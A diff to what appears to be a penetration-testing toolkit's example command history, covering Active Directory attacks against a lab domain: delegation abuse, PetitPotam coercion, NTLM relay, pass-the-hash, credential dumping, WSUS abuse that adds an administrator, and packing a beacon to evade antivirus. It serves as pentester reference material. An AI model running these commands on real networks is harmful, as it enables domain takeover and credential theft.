@@ -132,7 +132,6 @@ john --format=krb5tgs --wordlist=`fzf-wordlists` kerberoastables.txt
 polenum -u anonymous -p anonymous -d DC01.BREAKING.BAD
 cme smb 192.168.56.101 -u '' -p '' --pass-pol
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD/anonymous:anonymous'
-rbcd-attack -f SHUTDOWN -t SV01 -dc-ip DC01.BREAKING.BAD 'BREAKING\anonymous:anonymous'
 smbexec.py -share 'ADMIN$' -k SV01.BREAKING.BAD
 wmiexec.py -k SV01.BREAKING.BAD
 getST.py -spn CIFS/SV01@BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 'BREAKING.BAD/SHUTDOWN$:123soleil'
@@ -202,9 +201,9 @@ nmap --script broadcast-dhcp-discover
 SimplyEmail -all -e cybersyndicates.com
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
-rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -u anonymous -p anonymous -l DC01.BREAKING.BAD
-rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -u anonymous -p anonymous -l DC01.BREAKING.BAD
-rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -k -l DC01.BREAKING.BAD
+rbcd.py t-delegate-to 'sv01$' -dc-ip dc01 -action read 'BREAKING\anonymous:anonymous'
+rbcd.py -delegate-from shutdown -delegate-to 'sv01$' -dc-ip dc01 -action write 'BREAKING\anonymous:anonymous'
+rbcd.py -delegate-from shutdown -delegate-to 'sv01$' -dc-ip dc01 -action remove 'BREAKING\anonymous:anonymous'
 xfreerdp /d:BREAKING.BAD /u:someuser /pth:c1c635aa12ae60b7fe39e28456a7bac6 /v:SV01.BREAKING.BAD
 darkarmour -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
 amber -f beacon.exe
@@ -298,10 +297,12 @@ moodlescan -r -u http://192.168.10.10/
 pywhisker.py -v -d 'domain.local' -u 'user2' -H '126f1f9fdb9a7d9c7ba8d269728b7da0' -t 'sv01$' -a 'add' -o 'sv01'
 gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' 'domain.local'/'sv01$' 'sv01.ccache'
 getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' 'domain.local'/'sv01$'
-petitpotam -d '' -u '' -p '' 192.168.56.1 dc01.breaking.bad
+petitpotam.py 192.168.56.1 dc01.breaking.bad
+petitpotam.py -d breaking.bad -u someaccount -p somepassword 192.168.56.1 dc01.breaking.bad
 ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
 targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o kerberoastables.txt
 pass-station search tomcat
 nth --text 5f4dcc3b5aa765d61d8327deb882cf99
 pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
+DonPAPI.py breaking.bad/someadmin:somepassword@sometarget
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
